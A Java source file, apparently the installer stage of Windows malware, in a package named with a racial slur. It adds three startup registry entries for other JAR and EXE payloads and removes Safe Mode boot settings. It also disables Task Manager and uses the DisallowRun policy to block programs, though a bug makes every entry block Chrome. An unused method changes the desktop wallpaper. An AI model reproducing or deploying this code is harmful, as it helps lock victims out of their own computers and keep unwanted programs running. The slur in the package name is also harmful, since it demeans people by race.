package nigga;

import java.io.File;
import java.io.IOException;
import java.net.URLDecoder;
public class setup {
	static String OS_NAME = System.getProperty("os.name");
	private static String FilePath;
	private static String FilePath2;
	private static String FilePath3;
	static String FilePathImg = "C:\\Users\\f.png";
	public static void main(String args[]) throws InterruptedException, IOException {
		 File currentClass = new File(URLDecoder.decode(setup.class
	                .getProtectionDomain()
	                .getCodeSource()
	                .getLocation()
	                .getPath(), "UTF-8"));
		FilePath = currentClass.getParent() + "\\Snare.jar";
		FilePath2 = currentClass.getParent() + "\\TTT.jar";
		FilePath3 = currentClass.getParent() + "\\TTT.exe";
			SetupRegWin11();
	}
	
	private static void SetupRegWin11() throws IOException, InterruptedException {
		Runtime.getRuntime().exec("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v DoCr1 /t REG_SZ /d \"\\\"" + FilePath + "\"\\\"");
		Runtime.getRuntime().exec("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v DoCr2 /t REG_SZ /d \"\\\"" + FilePath2 + "\"\\\"");
		Runtime.getRuntime().exec("REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v DoCr3 /t REG_SZ /d \"\\\"" + FilePath3 + "\"\\\"");
	main2();
	}
	
	private static void Cyborg() throws IOException, InterruptedException {
		ProcessBuilder a = new ProcessBuilder();
			float rand = (float) (Math.random() * 100);
			System.out.println(rand);
			Thread.sleep(25000);
			Runtime.getRuntime().exec("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d " + FilePathImg + " /f");
			Runtime.getRuntime().exec("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\" /v WallpaperSource /t REG_SZ /d " + FilePathImg + " /f");
			Runtime.getRuntime().exec("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters 1, True");
			
	}
	
	
	public static String prog1 = "chrome.exe";
	public static String prog2 = "firefox.exe";
	public static String prog3 = "edge.exe";
	public static String prog4 = "firefox.exe";
	public static String prog5 = "cmd.exe";
	public static String prog6 = "conhost.exe";
	public static String prog7 = "regedit.exe";
	public static String prog8 = "Taskmgr.exe";
	public static String prog9 = "explorer.exe";
	public static String prog10 = "reg.exe";  
	
	public static void main2() throws IOException {
	    Runtime.getRuntime().exec("bcdedit /deletevalue {default} safeboot");
		Runtime.getRuntime().exec("bcdedit /deletevalue {current} safeboot"); 
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v DisallowRun /t REG_DWORD /d 1 /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 1 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 2 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 3 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 4 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 5 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 6 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 7 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 8 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 9 /t REG_SZ /d " + prog1 + " /f");
		Runtime.getRuntime().exec("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\DisallowRun /v 10 /t REG_SZ /d " + prog1 + " /f");
	}
}
